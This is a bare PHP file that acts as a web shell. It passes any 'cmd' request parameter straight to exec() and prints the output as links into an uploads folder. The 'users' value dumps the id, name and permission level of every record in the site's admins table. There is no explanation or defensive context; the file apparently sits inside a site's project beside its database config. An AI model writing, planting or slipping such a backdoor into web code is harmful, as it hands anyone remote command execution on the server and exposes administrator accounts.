<pre>
<?php

if(isset($_GET['cmd'])){
	$val=$_GET['cmd'];
if($val=="users"){
	include("config/db.php");
	$sql="select * from admins";
	$result=$con->query($sql);
	if($result->num_rows>0){
		while($rows = $result->fetch_assoc()){
			echo "id   = ".$rows["id"];
			echo "<br>";
			echo "Name = ".$rows["name"];
			echo "<br>";
			echo "yetki= ".$rows["yetki"];
			echo "<br>........................<br>";

		}

	}
	$con->close();
	
}else{
	$row = exec($val,$out);
	while(list(,$row) = each($out)){
		echo "<a target=\"_blank\" href=\"../uploads/".$row."\">".$row."</a>", "\n";	
	}
	
}

}



?>



